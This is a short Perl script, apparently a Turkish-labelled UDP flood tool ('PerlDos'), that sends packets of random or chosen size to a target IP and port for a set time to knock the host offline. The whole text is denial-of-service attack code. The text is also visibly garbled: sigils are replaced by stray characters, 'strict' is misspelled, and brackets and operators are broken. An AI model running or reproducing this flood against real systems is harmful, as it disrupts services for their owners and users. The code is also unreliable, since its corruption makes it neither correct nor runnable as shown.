* ! /usr/bin/perl
**
* ! /usr/bin/perl
use Socket ;
use striot ;
my (�ip,Sport,�size,�time) =@ARGV;
my (�iaddr,Sendtime,Spsize,Spport) ;
�iaddr=inet_aton ("�ip") or die "perl NaTPV2.pl Ip Port [Edit By NaTroN*] �ip/n";
�endtime=time () + (�time ? �time : 100) ;
socket (flood,PF_INET,SOCK_DGRAM, 17) ;


print
<<EOTEXT;
EOTEXT

print"~Saldiri Basladi Edit : MBE Software - PerlDos* : �ip". (Sport?Sport:"random") ."SALDIRI GUCU ".
 (�size?"�size-Gbit" : "SmackedWith A Large Packets?") ."".
 (�time ?  "for �time Saniye " : "") ."/n";
for  (; time () <=�endtime;) {
Spsize =�size ? �size : int (rand(1024-64) +64;
Spport -Sport ? Sport : int(rand(65500) ) +1;

send (flood,pack ("a�psize","flood") ,O,pack_sockaddr_in (�pport,�iaddr) ):)